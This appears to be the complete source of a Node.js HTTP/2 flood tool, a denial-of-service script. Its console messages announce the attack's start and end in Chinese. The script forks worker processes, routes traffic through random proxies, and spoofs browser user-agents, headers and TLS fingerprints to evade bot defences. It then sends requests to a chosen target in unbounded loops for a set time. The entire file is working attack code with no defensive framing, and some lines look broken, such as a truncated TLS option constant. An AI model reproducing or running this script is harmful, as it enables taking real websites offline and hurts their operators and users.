const fs = require('fs');
const http = require('http');
const http2 = require('http2');
const tls = require('tls');
const crypto = require('crypto');
const url = require('url');
const cluster = require('cluster');


process.on('uncaughtException', function(er) {
    //console.error(er)
});
process.on('unhandledRejection', function(er) {
    //console.error(er)
});
require('events').EventEmitter.defaultMaxListeners = 0;



if (process.argv.length < 7) {
    console.log(`Usage: ${process.argv[1]} target time threads reqs proxyfile GET/PRI refererfile`)
    process.exit(1)
}

var target = process.argv[2];
var time = process.argv[3];
var threads = process.argv[4];
var reqs = process.argv[5];
var proxyfile = process.argv[6];
var mode = process.argv[7];
var refererfile = process.argv[8];


var proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\x0A');
var referers = fs.readFileSync(refererfile, 'utf-8').toString().replace(/\r/g, '').split('\x0A');
var parsed = url.parse(target);
const payload = {};
var referer2 = referers[Math.floor(Math.random() * referers.length)];




const UAs = [
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.82 Safari/537.36 OPR/39.0.2256.55",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 OPR/52.0.2871.64 (Edition FCR)",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 OPR/32.0.1948.25",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36 OPR/52.0.2871.27 (Edition beta)",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.81 Safari/537.36 OPR/53.0.2907.14 (Edition beta)",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36 OPR/49.0.2725.34 (Edition Campaign 34)",
"Opera/9.50 (X11; Linux x86_64; sl-SI) Presto/2.11.299 Version/10.00",
"Opera/9.80 (Windows NT 6.0; WOW64; MRA 6.0 (build 5831)) Presto/2.12.388 Version/12.18",
"Mozilla/5.0 (Linux; Android 11; ASUS_I01WD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.78 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; ANA-NX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Mobile Safari/537.36 EdgA/101.0.1210.53",
"Mozilla/5.0 (Linux; Android 11; 2201117SY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.78 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; ONEPLUS A5000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.75 Mobile Safari/537.36 ABB/3.1.0",
"Mozilla/5.0 (Linux; Android 12; SM-G980F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.78 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; RMX3081 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.78 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-A515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.78 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 6.0; sr-rs; 5046Y Build/MRA58K) AppleWebKit/537.36 (KHTML%2C like Gecko) Version/4.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 6.0; ru-ru; 5080X Build/MRA58K) AppleWebKit/537.36 (KHTML%2C like Gecko) Version/4.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-G981B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.78 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; CPH2173 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.78 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; moto g(100) Build/S1RTS32.41-20-16-1-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45",
"Mozilla/5.0 (Linux; Android 11; moto g 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Mobile Safari/537.36 EdgA/101.0.1210.53",
"Mozilla/5.0 (Linux; Android 11; SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 EdgA/102.0.1245.30",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.33",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.33",
"Mozilla/5.0 (Android 6.0.1; Mobile; rv:101.0) Gecko/101.0 Firefox/101.0",
"Mozilla/5.0 (Android 7.1.2; Mobile; rv:101.0) Gecko/101.0 Firefox/101.0",
"Mozilla/5.0 (Android 5.0.1; Mobile; rv:101.0) Gecko/101.0 Firefox/101.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6; rv:104.0) Gecko/20110101 Firefox/104.0",
"Mozilla/5.0 (Windows NT 6.2; rv:10.0) Gecko/20100101 Firefox/40.0",
"Mozilla/5.0 (Wayland like X11; Fedora 36; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:100.0) Gecko/20071101 Firefox/100.0",
"Mozilla/5.0 (Android 11; Mobile; rv:103.0) Gecko/103.0 Firefox/103.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 12.0; rv:95.0) Gecko/20100101 Firefox/95.0",
"Mozilla/5.0 (Android 2.2.2; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0",
];






if (cluster.isMaster) { //当主进程运行时判断为真
	console.log('攻击开始 | 时间:',time);
   for (let ads = 0; ads < threads; ads++) {
       cluster.fork();
   }
} else {
	const sigalgs = ['ecdsa_secp256r1_sha256', 'ecdsa_secp384r1_sha384', 'ecdsa_secp521r1_sha512', 'rsa_pss_rsae_sha256', 'rsa_pss_rsae_sha384', 'rsa_pss_rsae_sha512', 'rsa_pkcs1_sha256', 'rsa_pkcs1_sha384', 'rsa_pkcs1_sha512']; //SSL_CTX_set1_sigalgs
	const cplist = [
	"ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA256", "ECDHE-ECDSA-AES256-SHA384", "ECDHE-RSA-AES256-SHA384"]; //Cipher suite
	var cipper = "";
	let SignalsList = sigalgs.join(':');

	function generatecipher() {
	  cipper = cplist[Math.floor(Math.random() * cplist.length)]
	}
	
	function main() {
		
		generatecipher();
		payload[':authority'] = parsed.host;
		payload[':method'] = mode;
		payload[':path'] = parsed.path;
		payload[':scheme'] = 'https';
		payload['accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
		payload['accept-encoding'] = 'gzip, deflate, br';
		payload['accept-language'] = 'en-US;q=0.8,en;q=0.7';
		payload['cache-control'] = 'max-age=0';
		payload['referer'] = referer2;
		payload['sec-ch-ua'] = '"Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"';
		payload['sec-ch-ua-mobile'] = '?0';
		payload['sec-ch-ua-platform'] = '"Windows"';
		payload['sec-fetch-dest'] = 'document';
		payload['sec-fetch-mode'] = 'navigate';
		payload['sec-fetch-user'] = '?1';
		payload['upgrade-insecure-requests'] = '1';
		payload['user-agent'] = UAs[Math.floor(Math.random() * UAs.length)];		
		
		this.curve = "GREASE:X25519:x25519";
		this.sigalgs = SignalsList;
		this.Opt = crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom		

		const keepAliveAgent = new http.Agent({
			keepAlive: true,
			keepAliveMsecs: 50000,
			maxSockets: Infinity
		});
		
		function Started() {
			for(let b=0; b < reqs; b++) {
				
				var proxy = proxies[Math.floor(Math.random() * proxies.length)];
				proxy = proxy.split(':');
				
				var connection = http['get']({
					host: proxy[0],
					port: proxy[1],
					ciphers: cipper,
					method: "CONNECT",
					agent: keepAliveAgent,
					path: parsed.host + ":443"				
				})
				connection.on('connect', function(res, socket, head) {
					const client = http2.connect(parsed.href, {
					  createConnection: () => {
						return tls.connect({
						  socket: socket,
						  ciphers: cipper,
						  host: parsed.host,
						  servername: parsed.host,
						  secure: true,
						  gzip: true,
						  followAllRedirects: true,
						  decodeEmails: false,
						  echdCurve: this.curve,
						  honorCipherOrder: true,
						  requestCert: true,
						  secureOptions: this.Opt,
						  sigalgs: this.sigalgs,
						  rejectUnauthorized: false,
						  ALPNProtocols: ['h2']
						}, () => {
							setInterval( () => {
								client.request(payload);
								connection.on("response", () => {
									connection.close();
								})
								connection.end();								
							})
						})
					  }
					})
				});
				connection.end();
			}
		}
		setInterval(Started);
		setTimeout(function() {
		  console.clear();
		  console.log('攻击结束');
		  process.exit()
		}, time * 1000);
	}
	main();
}